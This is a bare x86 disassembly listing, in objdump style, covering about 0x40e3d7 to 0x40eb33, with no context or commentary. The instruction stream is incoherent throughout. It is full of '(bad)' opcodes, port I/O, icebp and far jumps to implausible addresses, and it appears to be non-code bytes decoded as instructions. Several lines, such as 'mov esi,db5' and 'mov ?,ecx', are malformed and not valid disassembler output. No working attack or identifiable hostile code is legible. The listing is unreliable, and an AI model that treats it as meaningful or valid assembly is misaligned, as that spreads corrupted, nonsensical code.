  40e3d7:	and    eax,DWORD PTR [esi+0x1c]
  40e3da:	jmp    0xce388c94
  40e3df:	xor    bl,BYTE PTR ss:[ecx]
  40e3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3e3:	mov    BYTE PTR [ecx],al
  40e3e5:	mov    eax,ds:0xb36a5bf3
  40e3ea:	icebp  
  40e3eb:	js     0x40e39b
  40e3ed:	and    BYTE PTR [ebx+0x4070dd0e],ch
  40e3f3:	frstor [esi+0x63]
  40e3f6:	(bad)  
  40e3f7:	cmc    
  40e3f8:	mov    al,0x90
  40e3fa:	dec    edi
  40e3fb:	aas    
  40e3fc:	push   ebp
  40e3fd:	adc    esi,DWORD PTR [ebp-0x61]
  40e400:	pop    ss
  40e401:	ds icebp 
  40e403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e404:	call   0x4f0:0x8504829
  40e40b:	mov    eax,ds:0xf24b6889
  40e410:	outs   dx,BYTE PTR ds:[esi]
  40e411:	fwait
  40e412:	inc    eax
  40e413:	ror    al,cl
  40e415:	ds ja  0x40e3f4
  40e418:	xor    eax,0xd146a223
  40e41d:	std    
  40e41e:	jmp    0xf370f9ff
  40e423:	sar    BYTE PTR [esi-0x2d],cl
  40e426:	fcomi  st,st(6)
  40e428:	je     0x40e3bc
  40e42a:	leave  
  40e42b:	mov    ah,0xf5
  40e42d:	mov    ecx,0x42896ea7
  40e432:	imul   edx,DWORD PTR [edi+0x5a669f87],0x7
  40e439:	inc    ecx
  40e43a:	cmc    
  40e43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e43c:	ret    
  40e43d:	les    eax,FWORD PTR [ebp+0x10]
  40e440:	xchg   ecx,eax
  40e441:	jle    0x40e43e
  40e443:	in     eax,0xc6
  40e445:	push   0x3f3c107d
  40e44a:	jge    0x40e3e5
  40e44c:	ins    DWORD PTR es:[edi],dx
  40e44d:	or     eax,DWORD PTR [edx+edx*2-0x5257bbdb]
  40e454:	out    dx,al
  40e455:	push   es
  40e456:	xor    DWORD PTR [esp+ebx*8],0x29
  40e45a:	ret    0x1487
  40e45d:	test   eax,0xf1a36e23
  40e462:	int    0x2e
  40e464:	cmp    BYTE PTR [edi],ah
  40e466:	and    dl,BYTE PTR [edx+edi*4]
  40e469:	pop    eax
  40e46a:	nop
  40e46b:	adc    al,0x3a
  40e46d:	mov    ch,0xb2
  40e46f:	mov    dl,0xa3
  40e471:	xor    DWORD PTR [edi+0x13],0xfffffff6
  40e475:	mov    esi,0x4fa6395c
  40e47a:	xor    cl,bh
  40e47c:	repz retf 
  40e47e:	stc    
  40e47f:	jecxz  0x40e49f
  40e481:	mov    esp,0x4598421f
  40e486:	adc    esi,DWORD PTR [eax+0x6312aeb3]
  40e48c:	sbb    eax,0xc4c09bb1
  40e491:	push   esp
  40e492:	mov    ah,0x8b
  40e494:	clc    
  40e495:	imul   esp,DWORD PTR [ebx-0x6d],0xffffff94
  40e499:	mov    al,ds:0x47a81c3f
  40e49e:	and    al,0x95
  40e4a0:	xor    BYTE PTR ds:0xb23dd260,al
  40e4a6:	cmp    esi,DWORD PTR [ecx+0x56]
  40e4a9:	xor    dl,BYTE PTR [ebx]
  40e4ab:	aad    0x73
  40e4ad:	or     eax,0x9336bbba
  40e4b2:	ss inc ebp
  40e4b4:	mov    ebx,0xf44e37fb
  40e4b9:	clc    
  40e4ba:	mov    ah,0x77
  40e4bc:	daa    
  40e4bd:	out    dx,eax
  40e4be:	mov    dl,0xa3
  40e4c0:	out    0x6a,eax
  40e4c2:	ret    
  40e4c3:	or     eax,0x92585a30
  40e4c8:	inc    eax
  40e4c9:	sub    al,0x8
  40e4cb:	cmp    esp,0x27
  40e4ce:	pop    esp
  40e4cf:	sub    eax,0x53ed1e1
  40e4d4:	ror    BYTE PTR [eax-0x5a],1
  40e4d7:	xchg   ebp,eax
  40e4d8:	sub    BYTE PTR [eax],0xe
  40e4db:	xor    eax,0xf2d2380f
  40e4e0:	sahf   
  40e4e1:	addr16 inc esp
  40e4e3:	jp     0x40e49f
  40e4e5:	ficomp DWORD PTR [ebp-0x11]
  40e4e8:	add    al,0x53
  40e4ea:	bts    ecx,edx
  40e4ed:	ficomp WORD PTR [ecx]
  40e4ef:	inc    esi
  40e4f0:	inc    esp
  40e4f1:	scas   al,BYTE PTR es:[edi]
  40e4f2:	and    al,0x19
  40e4f4:	dec    esp
  40e4f5:	ret    
  40e4f6:	stc    
  40e4f7:	pop    es
  40e4f8:	and    al,0x31
  40e4fa:	out    dx,eax
  40e4fb:	pushf  
  40e4fc:	push   esi
  40e4fd:	imul   ebx,DWORD PTR [edx-0x15],0xe86f6bb0
  40e504:	shrd   DWORD PTR [edi-0x12],eax,0x72
  40e509:	add    ch,dl
  40e50b:	jmp    0x40e4b6
  40e50d:	ret    0x219d
  40e510:	shl    ah,cl
  40e512:	push   esp
  40e513:	add    dl,BYTE PTR [esi-0x6d]
  40e516:	sbb    edx,DWORD PTR [ecx-0xb]
  40e519:	neg    dl
  40e51b:	and    eax,0x6764ea77
  40e520:	push   ds
  40e521:	dec    ebp
  40e522:	pop    ebx
  40e523:	fdivr  QWORD PTR ds:0x688dd2a2
  40e529:	test   DWORD PTR [ebp-0x34],ebp
  40e52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e52d:	xor    BYTE PTR [esi-0x1aa16d66],al
  40e533:	push   es
  40e534:	cwde   
  40e535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e536:	xchg   esp,eax
  40e537:	pop    esp
  40e538:	bound  edi,QWORD PTR [esi]
  40e53a:	push   edx
  40e53b:	cmp    ch,al
  40e53d:	stos   BYTE PTR es:[edi],al
  40e53e:	gs dec edi
  40e540:	fwait
  40e541:	sub    ebp,DWORD PTR [edx]
  40e543:	bnd ja 0x40e4d8
  40e546:	jmp    0xf46ce7a3
  40e54b:	mov    ebx,ss
  40e54d:	gs push eax
  40e54f:	mov    dl,0x3f
  40e551:	das    
  40e552:	imul   ecx,DWORD PTR [eax],0x60
  40e555:	inc    BYTE PTR [ebx-0x2872ad96]
  40e55b:	adc    edx,DWORD PTR [eax+0x76]
  40e55e:	mov    dl,0xd5
  40e560:	pop    eax
  40e561:	cmp    al,0xc0
  40e563:	sub    eax,0x4ff800b3
  40e568:	cmp    al,0xf3
  40e56a:	push   edi
  40e56b:	clc    
  40e56c:	mov    ebp,0xdf909717
  40e571:	scas   al,BYTE PTR es:[edi]
  40e572:	shl    esi,cl
  40e574:	xchg   ebp,eax
  40e575:	lahf   
  40e576:	push   0x79
  40e578:	pop    ebx
  40e579:	inc    ebp
  40e57a:	(bad)  
  40e57c:	pop    esp
  40e57d:	mov    esi,DWORD PTR [edx]
  40e57f:	les    esi,FWORD PTR [ebp+eiz*8-0x68811074]
  40e586:	jae    0x40e57c
  40e588:	dec    ebx
  40e589:	clc    
  40e58a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e58b:	or     DWORD PTR gs:[edx],eax
  40e58e:	and    eax,0x5eaabd81
  40e593:	imul   edi,DWORD PTR [edi-0x3fc1e5cc],0x77
  40e59a:	inc    edi
  40e59b:	out    dx,al
  40e59c:	stos   DWORD PTR es:[edi],eax
  40e59d:	mov    al,ds:0xf3f0f0e8
  40e5a2:	xor    al,0xc
  40e5a4:	dec    ebp
  40e5a5:	aas    
  40e5a6:	pcmpeqd mm1,QWORD PTR [esi]
  40e5a9:	jecxz  0x40e5e3
  40e5ab:	test   BYTE PTR [edx+0x7c],ch
  40e5ae:	stos   BYTE PTR es:[edi],al
  40e5af:	outs   dx,DWORD PTR ds:[esi]
  40e5b0:	mov    al,0xcb
  40e5b2:	push   edx
  40e5b3:	shl    DWORD PTR ds:0x36a4ccef,1
  40e5b9:	iret   
  40e5ba:	adc    BYTE PTR [esi+eiz*8+0x50],0x19
  40e5bf:	push   ds
  40e5c0:	and    BYTE PTR [ebp+0x4db2dc8e],dl
  40e5c6:	xor    al,0x4
  40e5c8:	adc    al,BYTE PTR [ebx]
  40e5ca:	mov    edi,DWORD PTR [ebx+edi*4-0x53]
  40e5ce:	daa    
  40e5cf:	(bad)  
  40e5d0:	test   eax,0x7570f135
  40e5d5:	inc    esp
  40e5d6:	add    eax,0xdc6661c0
  40e5db:	mov    eax,0x3b306f02
  40e5e0:	cmp    al,0xfb
  40e5e2:	cld    
  40e5e3:	aaa    
  40e5e4:	frstorw [eax-0x38552d0a]
  40e5eb:	std    
  40e5ec:	cdq    
  40e5ed:	fmul   DWORD PTR [edx-0x25]
  40e5f0:	stc    
  40e5f1:	fimul  WORD PTR [ebp-0x7e319048]
  40e5f7:	jne    0x40e676
  40e5f9:	cmp    al,0x6
  40e5fb:	out    0x63,al
  40e5fd:	imul   ebp,DWORD PTR [esi],0xf237d34c
  40e603:	stc    
  40e604:	adc    BYTE PTR [ecx],al
  40e606:	jb     0x40e5e3
  40e608:	(bad)  
  40e609:	(bad)  
  40e60a:	add    edx,esi
  40e60c:	retf   0x12fa
  40e60f:	xor    eax,0x137fab31
  40e614:	mov    WORD PTR [esi-0xa],fs
  40e617:	out    dx,al
  40e618:	jbe    0x40e64e
  40e61a:	out    0x6d,eax
  40e61c:	mov    ds:0xd0754a28,al
  40e621:	sub    al,0xa9
  40e623:	sti    
  40e624:	xchg   BYTE PTR [eax+0x7c],bl
  40e627:	in     eax,0xd4
  40e629:	ja     0x40e62a
  40e62b:	pop    ebp
  40e62c:	sbb    edx,ebx
  40e62e:	js     0x40e67c
  40e630:	sbb    dh,BYTE PTR [edx-0x68]
  40e633:	popa   
  40e634:	not    DWORD PTR [ecx]
  40e636:	call   0x45c54373
  40e63b:	jp     0x40e5ec
  40e63d:	adc    ecx,DWORD PTR [esi]
  40e63f:	mov    edx,0x24e249cb
  40e644:	mov    edi,0x4ca14a69
  40e649:	aam    0x97
  40e64b:	adc    bl,ah
  40e64d:	mov    esi,db5
  40e650:	add    esp,DWORD PTR ds:0x246ab32
  40e656:	or     dl,bh
  40e658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e659:	mov    ?,ecx
  40e65b:	and    BYTE PTR ds:0x5f46af6a,ah
  40e661:	pusha  
  40e662:	add    DWORD PTR [edi-0x16],esp
  40e665:	adc    ebp,0xac091ec4
  40e66b:	ins    DWORD PTR es:[edi],dx
  40e66c:	ret    
  40e66d:	loope  0x40e687
  40e66f:	add    cl,BYTE PTR [eax]
  40e671:	retf   
  40e672:	xor    dl,BYTE PTR [ecx+0x2]
  40e675:	xchg   esi,eax
  40e676:	sub    eax,0x42327baa
  40e67b:	nop
  40e67c:	stos   BYTE PTR es:[edi],al
  40e67d:	icebp  
  40e67e:	ret    
  40e67f:	jae    0x40e680
  40e681:	(bad)  
  40e682:	xchg   ecx,eax
  40e683:	inc    eax
  40e684:	loopne 0x40e6e6
  40e686:	xchg   edx,eax
  40e687:	shl    DWORD PTR [edx+0x4da4d077],cl
  40e68d:	jg     0x40e620
  40e68f:	pop    ecx
  40e690:	shl    cl,cl
  40e692:	mov    ch,0x31
  40e694:	mov    WORD PTR [eax+0x52],gs
  40e697:	mov    ds:0x169a3466,eax
  40e69c:	fild   QWORD PTR [esi]
  40e69e:	xor    eax,0xab7c6c53
  40e6a3:	lahf   
  40e6a4:	ficomp DWORD PTR [eax-0x7d]
  40e6a7:	push   es
  40e6a8:	inc    eax
  40e6a9:	adc    esp,DWORD PTR [ebp-0x68]
  40e6ac:	jbe    0x40e709
  40e6ae:	fstp   QWORD PTR [ebx-0x33d92b2d]
  40e6b4:	add    edx,DWORD PTR [ebp+0xbbb20ad]
  40e6ba:	pop    ebx
  40e6bb:	mov    esp,fs
  40e6bd:	and    BYTE PTR [edx],bl
  40e6bf:	rol    edi,1
  40e6c1:	mov    ds:0x89f30d88,eax
  40e6c6:	aaa    
  40e6c7:	lods   eax,DWORD PTR ds:[esi]
  40e6c8:	bound  ebp,QWORD PTR [ecx+ebp*8-0x5]
  40e6cc:	cdq    
  40e6cd:	inc    edx
  40e6ce:	pshufw mm1,QWORD PTR [eax],0x8c
  40e6d2:	iret   
  40e6d3:	jmp    0x40e6b2
  40e6d5:	fwait
  40e6d6:	ins    BYTE PTR es:[edi],dx
  40e6d7:	sub    DWORD PTR [edi],esi
  40e6d9:	test   al,0x56
  40e6db:	js     0x40e70e
  40e6dd:	(bad)  
  40e6de:	gs push 0x69
  40e6e1:	xor    eax,0x82c324dc
  40e6e6:	mov    ebp,0x42768bac
  40e6eb:	div    BYTE PTR [ebx-0x2091ddf4]
  40e6f1:	xor    al,0x88
  40e6f3:	cmp    DWORD PTR [ebx+0x4f],ebx
  40e6f6:	iret   
  40e6f7:	nop
  40e6f8:	mov    DWORD PTR [eax-0x6a23e3ea],ecx
  40e6fe:	and    ebx,DWORD PTR [esi]
  40e700:	mov    bl,0x85
  40e702:	adc    DWORD PTR [ecx+0x6158752e],esp
  40e708:	ret    
  40e709:	addr16 push edi
  40e70b:	fadd   st,st(1)
  40e70d:	stos   BYTE PTR es:[edi],al
  40e70e:	in     al,dx
  40e70f:	fcom   QWORD PTR [edi-0x78b9897d]
  40e715:	sahf   
  40e716:	(bad)  
  40e718:	js     0x40e704
  40e71a:	sar    eax,cl
  40e71c:	jne    0x40e6f7
  40e71e:	pop    ss
  40e71f:	jl     0x40e6c2
  40e721:	adc    DWORD PTR [eax],ebp
  40e723:	repnz push es
  40e725:	cmp    al,0xab
  40e727:	add    DWORD PTR [ebp+0x3b328afd],0x67524190
  40e731:	jl     0x40e799
  40e733:	add    eax,0x7df678fe
  40e738:	rcr    DWORD PTR [esi-0x53],0xae
  40e73c:	test   al,0x18
  40e73e:	aaa    
  40e73f:	es xor edx,esi
  40e742:	repz jecxz 0x40e705
  40e745:	inc    ebp
  40e746:	sub    DWORD PTR [ebx],ebp
  40e748:	add    esp,DWORD PTR [eax]
  40e74a:	pop    ecx
  40e74b:	mov    al,0x5c
  40e74d:	pusha  
  40e74e:	jmp    0xcdf585fd
  40e753:	pop    esi
  40e754:	xor    eax,0xe720da41
  40e759:	sub    dh,BYTE PTR [ecx+0x38]
  40e75c:	jg     0x40e740
  40e75e:	push   ss
  40e75f:	std    
  40e760:	mov    edx,0xc44268de
  40e765:	test   al,0x87
  40e767:	xchg   ecx,eax
  40e768:	push   edx
  40e769:	pushf  
  40e76a:	cmp    DWORD PTR [edi-0x54b87a51],ecx
  40e770:	(bad)  
  40e771:	pusha  
  40e772:	pop    ss
  40e773:	pop    es
  40e774:	mov    ah,0xba
  40e776:	call   0xb6b6:0x5306dec1
  40e77d:	imul   eax,edi,0x98a38d87
  40e783:	stos   DWORD PTR es:[edi],eax
  40e784:	aad    0x6
  40e786:	pop    eax
  40e787:	sahf   
  40e788:	mov    esp,0xe0040344
  40e78d:	in     al,0x83
  40e78f:	sub    edi,edi
  40e791:	mov    ds:0xeee7caaa,eax
  40e796:	push   0x212354b2
  40e79b:	daa    
  40e79c:	pushf  
  40e79d:	cmp    DWORD PTR [ecx+esi*8+0x4a],ebx
  40e7a1:	clc    
  40e7a2:	xchg   ebp,eax
  40e7a3:	js     0x40e818
  40e7a5:	add    eax,0x2290527b
  40e7aa:	xchg   edx,eax
  40e7ab:	nop
  40e7ac:	fnstcw WORD PTR [ebp-0x110b76e8]
  40e7b2:	mov    ecx,0x7233815b
  40e7b7:	inc    ebx
  40e7b8:	mov    dl,0xe3
  40e7ba:	add    BYTE PTR [eax-0xe5b9875],al
  40e7c0:	test   BYTE PTR [edx-0x67a1e02a],ch
  40e7c6:	fwait
  40e7c7:	xchg   ebp,eax
  40e7c8:	sbb    bl,ch
  40e7ca:	fcomp  st(0)
  40e7cc:	cdq    
  40e7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7ce:	inc    ebp
  40e7cf:	jg     0x40e799
  40e7d1:	pop    esi
  40e7d2:	jp     0x40e78e
  40e7d4:	in     al,dx
  40e7d5:	sub    al,0xc2
  40e7d7:	iret   
  40e7d8:	retf   0x7a81
  40e7db:	push   eax
  40e7dc:	mov    bh,0xb0
  40e7de:	mov    dl,0xc6
  40e7e0:	(bad)  
  40e7e1:	pop    ecx
  40e7e2:	loope  0x40e76e
  40e7e4:	jmp    0x3313:0x24c5b70e
  40e7eb:	jl     0x40e7fe
  40e7ed:	inc    esp
  40e7ee:	fdivrp st(0),st
  40e7f0:	dec    edx
  40e7f1:	idiv   DWORD PTR [ebx*1-0x74c80af9]
  40e7f8:	dec    ebp
  40e7f9:	push   edi
  40e7fa:	stos   DWORD PTR es:[edi],eax
  40e7fb:	adc    BYTE PTR [edi-0x50b96938],al
  40e801:	push   esi
  40e802:	push   es
  40e803:	jae    0x40e84d
  40e805:	loopne 0x40e863
  40e807:	loope  0x40e7c8
  40e809:	fsubr  DWORD PTR [edx+eax*2]
  40e80c:	push   eax
  40e80d:	shr    DWORD PTR [ecx-0x7741a376],cl
  40e813:	xor    eax,0xb0b390b3
  40e818:	sub    al,0x85
  40e81a:	int3   
  40e81b:	add    eax,0x3a1b90d1
  40e820:	rcl    DWORD PTR [edi],1
  40e822:	dec    eax
  40e823:	adc    DWORD PTR [ebx-0x3455a4dd],eax
  40e829:	pushf  
  40e82a:	sub    ebp,ebx
  40e82c:	pop    edx
  40e82d:	shr    BYTE PTR [ecx-0x1c],1
  40e830:	mov    edi,0xc46b7927
  40e835:	push   ecx
  40e836:	test   DWORD PTR [edx+0x47],esp
  40e839:	rcl    DWORD PTR [ebp-0x6410714d],0x68
  40e840:	cwde   
  40e841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e842:	(bad)  
  40e843:	mov    ecx,0x97b06ef2
  40e848:	je     0x40e7e9
  40e84a:	add    eax,DWORD PTR ds:0x3f2c4854
  40e850:	adc    ebp,DWORD PTR [edx+0x4a738792]
  40e856:	jmp    0xb207e94a
  40e85b:	push   es
  40e85c:	pop    eax
  40e85d:	push   ebp
  40e85e:	dec    edi
  40e85f:	cmp    bh,BYTE PTR [edx+esi*1-0x18488302]
  40e866:	ret    0x816f
  40e869:	out    dx,eax
  40e86a:	mov    bh,0x98
  40e86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e86d:	lods   al,BYTE PTR ds:[esi]
  40e86e:	int3   
  40e86f:	repnz out dx,eax
  40e871:	dec    ecx
  40e872:	xchg   esp,eax
  40e873:	push   ebp
  40e874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e875:	mov    esi,0xa8925ff9
  40e87a:	or     eax,0x1f727830
  40e87f:	test   DWORD PTR [ebp-0x714d4347],0xfa543c0a
  40e889:	jecxz  0x40e8de
  40e88b:	pop    ds
  40e88c:	aas    
  40e88d:	pop    edx
  40e88e:	fmul   st(2),st
  40e890:	popa   
  40e891:	push   0x9d59427e
  40e896:	fwait
  40e897:	inc    ebx
  40e898:	jg     0x40e8cd
  40e89a:	sub    al,0x9d
  40e89c:	sub    eax,0xa32b5ebc
  40e8a1:	mov    DWORD PTR [edi],edi
  40e8a3:	dec    esi
  40e8a4:	or     ch,BYTE PTR [esi+0x3e059f21]
  40e8aa:	mov    bl,0x17
  40e8ac:	xor    DWORD PTR [ebx-0x1],esi
  40e8af:	in     eax,0x78
  40e8b1:	(bad)  
  40e8b2:	jae    0x40e918
  40e8b4:	xchg   esp,esp
  40e8b6:	xlat   BYTE PTR ds:[ebx]
  40e8b7:	ins    BYTE PTR es:[edi],dx
  40e8b8:	push   edi
  40e8b9:	push   0xffffffc6
  40e8bb:	icebp  
  40e8bc:	cmp    esp,esi
  40e8be:	mov    WORD PTR [esi],ds
  40e8c0:	stos   BYTE PTR es:[edi],al
  40e8c1:	ficomp WORD PTR [esi-0x2cd3f243]
  40e8c7:	pop    eax
  40e8c8:	push   DWORD PTR [eax]
  40e8ca:	aam    0xd5
  40e8cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8cd:	and    ebx,DWORD PTR [ecx]
  40e8cf:	pop    esp
  40e8d0:	cwde   
  40e8d1:	mov    edx,0x1a2ff0c8
  40e8d6:	cmp    al,0x45
  40e8d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8d9:	mov    ch,0x24
  40e8db:	sbb    ebp,ecx
  40e8dd:	xchg   esp,eax
  40e8de:	push   esi
  40e8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8e0:	shl    BYTE PTR [esi+0x33],1
  40e8e3:	addr16 ret 0xe6a5
  40e8e7:	aas    
  40e8e8:	inc    esi
  40e8e9:	push   esp
  40e8ea:	outs   dx,DWORD PTR ds:[esi]
  40e8eb:	adc    cl,BYTE PTR [edi+edi*4-0xb]
  40e8ef:	hlt    
  40e8f0:	retf   
  40e8f1:	xchg   edi,eax
  40e8f2:	retf   
  40e8f3:	sub    BYTE PTR [ecx-0x51],dh
  40e8f6:	fwait
  40e8f7:	jmp    0x88fe:0x45b92fee
  40e8fe:	aad    0x24
  40e900:	add    edi,DWORD PTR [esi-0x2aadc41b]
  40e906:	cmp    esi,DWORD PTR ds:0x2f345d90
  40e90c:	call   FWORD PTR [ecx+0x3d3adf5f]
  40e912:	pop    es
  40e913:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40e915:	inc    ebp
  40e916:	shr    BYTE PTR [edx],0xf2
  40e919:	int3   
  40e91a:	(bad)  
  40e91b:	mov    ebp,0x5d48fbf2
  40e920:	rol    BYTE PTR [eax],1
  40e922:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e924:	test   BYTE PTR [ecx+eiz*1],0x9
  40e928:	and    DWORD PTR [edi],ebx
  40e92a:	ins    DWORD PTR es:[edi],dx
  40e92b:	js     0x40e930
  40e92d:	inc    ebx
  40e92e:	fmul   QWORD PTR [ebx+eiz*1]
  40e931:	push   ds
  40e932:	push   esp
  40e933:	or     bl,BYTE PTR [esi-0x68fe8fcb]
  40e939:	xchg   esi,eax
  40e93a:	inc    BYTE PTR [ebp+0x53]
  40e93d:	pop    es
  40e93e:	les    ecx,FWORD PTR [ebp-0x1f]
  40e941:	cwde   
  40e942:	je     0x40e9b0
  40e944:	sub    edx,DWORD PTR [ecx-0x635091d8]
  40e94a:	sbb    edx,DWORD PTR ds:0x4c89d290
  40e950:	daa    
  40e951:	fsubr  QWORD PTR [esi-0x2]
  40e954:	mov    eax,ds:0xac8acdb2
  40e959:	jg     0x40e8f0
  40e95b:	and    BYTE PTR [esi+0x7d4ef084],ch
  40e961:	pusha  
  40e962:	jmp    0x40e91b
  40e964:	das    
  40e965:	mov    cl,BYTE PTR ds:0xb919f9f
  40e96b:	push   esi
  40e96c:	rol    DWORD PTR [edi+0x24],1
  40e96f:	add    esi,DWORD PTR [eax+edi*4+0x770cf9d4]
  40e976:	mov    dh,0x9d
  40e978:	dec    esi
  40e979:	mov    ds:0x6d54a0b9,al
  40e97e:	out    dx,al
  40e97f:	sbb    dh,BYTE PTR [eax+0x78]
  40e982:	sbb    esp,DWORD PTR [edx]
  40e984:	test   BYTE PTR [esi],ah
  40e986:	push   edx
  40e987:	clc    
  40e988:	sbb    BYTE PTR [eax-0x4285b20e],ch
  40e98e:	inc    ebx
  40e98f:	xor    bh,ah
  40e991:	sub    al,0xd2
  40e993:	add    BYTE PTR ds:0x517a70ac,ch
  40e999:	repnz mov ds:0xec81d713,eax
  40e99f:	sbb    ebp,eax
  40e9a1:	mov    bh,BYTE PTR [edx]
  40e9a3:	ds sub cl,ch
  40e9a6:	scas   eax,DWORD PTR es:[edi]
  40e9a7:	mov    eax,ds:0x660ed172
  40e9ac:	xchg   edi,eax
  40e9ad:	sbb    ecx,esi
  40e9af:	xor    eax,0x81d22f6d
  40e9b4:	loope  0x40ea11
  40e9b6:	in     al,0xd1
  40e9b8:	(bad)  
  40e9b9:	imul   esp,DWORD PTR [edx-0x5a],0x3b6c8dc2
  40e9c0:	lods   eax,DWORD PTR ds:[esi]
  40e9c1:	mov    eax,?
  40e9c3:	push   esp
  40e9c4:	adc    eax,0xd055a765
  40e9c9:	sbb    al,BYTE PTR [ecx+0xa56a7d9]
  40e9cf:	adc    BYTE PTR [bx],bh
  40e9d2:	adc    al,0xc8
  40e9d4:	imul   edx,ebx,0x69b07646
  40e9da:	jb     0x40e9b8
  40e9dc:	push   esi
  40e9dd:	call   0xe439da5a
  40e9e2:	mov    dh,0x22
  40e9e4:	jmp    0x640065e6
  40e9e9:	pushf  
  40e9ea:	pop    esi
  40e9eb:	push   es
  40e9ec:	jg     0x40ea16
  40e9ee:	jo     0x40e982
  40e9f0:	pop    ebp
  40e9f1:	setl   BYTE PTR [esi+eiz*1]
  40e9f5:	jecxz  0x40e99e
  40e9f7:	mov    ds:0x190880d5,al
  40e9fc:	push   esp
  40e9fd:	inc    ecx
  40e9fe:	pop    ebx
  40e9ff:	arpl   WORD PTR [di+0x71aa],dx
  40ea04:	jge    0x40e9f7
  40ea06:	daa    
  40ea07:	out    dx,eax
  40ea08:	cmc    
  40ea09:	cmp    esi,DWORD PTR [esi+0x2f]
  40ea0c:	enter  0xb6a0,0xdb
  40ea10:	retf   0xf610
  40ea13:	add    DWORD PTR [esi],eax
  40ea15:	dec    edi
  40ea16:	push   esp
  40ea17:	iret   
  40ea18:	out    0xf3,eax
  40ea1a:	xor    DWORD PTR [eax+0x7bcb36d2],esi
  40ea20:	jb     0x40e9f0
  40ea22:	dec    eax
  40ea23:	ret    
  40ea24:	mov    al,0xd1
  40ea26:	cmc    
  40ea27:	iret   
  40ea28:	into   
  40ea29:	lock mov al,ds:0xe14fd199
  40ea2f:	xor    al,0xb7
  40ea31:	fistp  QWORD PTR ds:0x39fc280d
  40ea37:	cmp    DWORD PTR [eax+0x20b8332e],ecx
  40ea3d:	daa    
  40ea3e:	or     eax,0xacf38965
  40ea43:	inc    ecx
  40ea44:	(bad)  
  40ea45:	mov    esi,0xc82de05a
  40ea4a:	ins    BYTE PTR es:[edi],dx
  40ea4b:	pop    ebx
  40ea4c:	dec    ebp
  40ea4d:	aas    
  40ea4e:	add    BYTE PTR [ecx],ah
  40ea50:	stos   BYTE PTR es:[edi],al
  40ea51:	mov    esi,0x50ec04c2
  40ea56:	or     al,0xbc
  40ea58:	mov    dh,0x8b
  40ea5a:	pop    esi
  40ea5b:	rcr    BYTE PTR [edi],1
  40ea5d:	test   al,0xca
  40ea5f:	sub    bh,BYTE PTR [esi+0x4b]
  40ea62:	jecxz  0x40ea67
  40ea64:	mov    esi,cs
  40ea66:	inc    ecx
  40ea67:	sub    edi,DWORD PTR [eax+0x2caac6ff]
  40ea6d:	push   ds
  40ea6e:	jl     0x40ea0b
  40ea70:	cmp    DWORD PTR [ebx],edi
  40ea72:	fldenv [ebx-0x2e806f99]
  40ea78:	adc    ebp,esp
  40ea7a:	fsub   st(4),st
  40ea7c:	jae    0x40ea32
  40ea7e:	push   ebx
  40ea7f:	imul   ebp,DWORD PTR [esi-0x6440dea2],0x23
  40ea86:	or     ebx,DWORD PTR [edi]
  40ea88:	cmp    al,0xb8
  40ea8a:	inc    esi
  40ea8b:	or     dl,BYTE PTR [esi+0xe]
  40ea8e:	(bad)  
  40ea8f:	retf   
  40ea90:	popf   
  40ea91:	shr    DWORD PTR [eax],0x4a
  40ea94:	cli    
  40ea95:	scas   al,BYTE PTR es:[edi]
  40ea96:	xor    BYTE PTR [eax+0x32987a3d],cl
  40ea9c:	shl    ah,0xee
  40ea9f:	iret   
  40eaa0:	xchg   esi,eax
  40eaa1:	mov    ds:0x3527b323,eax
  40eaa6:	and    ch,BYTE PTR ds:0x82cf34a9
  40eaac:	mov    esp,DWORD PTR [ebp+0x1199531c]
  40eab2:	(bad)  
  40eab3:	and    ch,BYTE PTR [esp+edx*8-0x489e104d]
  40eaba:	add    ecx,DWORD PTR [ebp-0x29]
  40eabd:	dec    ebp
  40eabe:	das    
  40eabf:	in     eax,0x62
  40eac1:	cmp    esi,DWORD PTR ds:0x853e876c
  40eac7:	mov    bh,dh
  40eac9:	fdivr  DWORD PTR ds:0x3dcd46a9
  40eacf:	xlat   BYTE PTR ds:[ebx]
  40ead0:	repnz aam 0x78
  40ead3:	sub    al,0x1a
  40ead5:	inc    esi
  40ead6:	adc    DWORD PTR [edi+0x24a52829],eax
  40eadc:	pop    ebp
  40eadd:	retf   0xaa9a
  40eae0:	adc    BYTE PTR [ecx],dh
  40eae2:	ds inc ecx
  40eae4:	adc    al,0xd3
  40eae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eae7:	push   edx
  40eae8:	cmp    ecx,DWORD PTR [edx+0xc4ea099]
  40eaee:	jb     0x40eb0f
  40eaf0:	pop    edi
  40eaf1:	rol    DWORD PTR [edx+0x20],0x36
  40eaf5:	in     al,0xc4
  40eaf7:	or     BYTE PTR [ebp-0x395c4b91],dl
  40eafd:	add    esp,ebx
  40eaff:	clc    
  40eb00:	(bad)  
  40eb01:	repnz mov cl,0x63
  40eb04:	jge    0x40eb76
  40eb06:	out    0xc6,al
  40eb08:	idiv   DWORD PTR [ebp+0x310dd2eb]
  40eb0e:	mov    eax,ds:0xbc6e9e00
  40eb13:	jmp    0x40eb89
  40eb15:	nop
  40eb16:	cmc    
  40eb17:	call   0x2bcc7362
  40eb1c:	lods   al,BYTE PTR ds:[esi]
  40eb1d:	les    edx,FWORD PTR [esi+0x1a]
  40eb20:	xor    al,0xf5
  40eb22:	dec    edx
  40eb23:	ret    
  40eb24:	int3   
  40eb25:	and    al,0xfc
  40eb27:	frstor [ebx+0x299c5604]
  40eb2d:	cmp    esi,DWORD PTR [edi]
  40eb2f:	or     al,0x18
  40eb31:	jo     0x40eab9
  40eb33:	jle    0x40eb57
